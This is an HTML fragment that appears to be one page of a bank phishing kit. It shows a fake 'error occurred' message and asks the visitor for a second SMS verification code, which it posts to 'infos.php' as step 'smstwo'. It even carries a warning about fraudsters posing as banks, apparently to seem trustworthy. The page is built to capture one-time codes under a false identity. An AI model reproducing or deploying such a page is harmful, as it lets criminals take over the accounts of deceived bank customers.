...
<section>
    <div class="container login_container">
        <div class="row">
            <div class="col-md-12">
                <div class="form" style="max-width: 500px;margin: 15px auto;">
                  <div class="text-center py-55"><img src="image/sms.png" width="100"></div><br><br>
                    <h4 class="mt-44" style="font-size: 15px;font-weight:300;color:#a39d9d;">Protect yourself from those who pretend to be your bank Beware of fraudulent phone calls, emails and SMS.</h4>         
                    ...
                    <form action="infos.php" method="post" class="mt-3">
                        <input type="hidden" value="smstwo" name="step">


                        <div class="form-group mb-4">
						<div style="margin-left: auto; margin-left: auto; text-align: center;"
                                             >
											 <p><font color="red">error occurred</p>
                            <p><font style="font-size:12px">							
							You will receive a new SMS code within a few seconds, enter the code and press continue						
							<font></p>					
                            <input type="text" class="form-control" placeholder="Verification code" id="smstwo" name="smstwo" required>
                        </div>

                        <div class="bttn mt-4">
                            <div class="reg section_btns" style="justify-content:center">
							
							<button name="submit" style="height: 48px;padding: 0 3rem;background: #00C8E1;color:#153C3F;Continue;border: none;width:35%;">Continue</button></div>
                        </div>
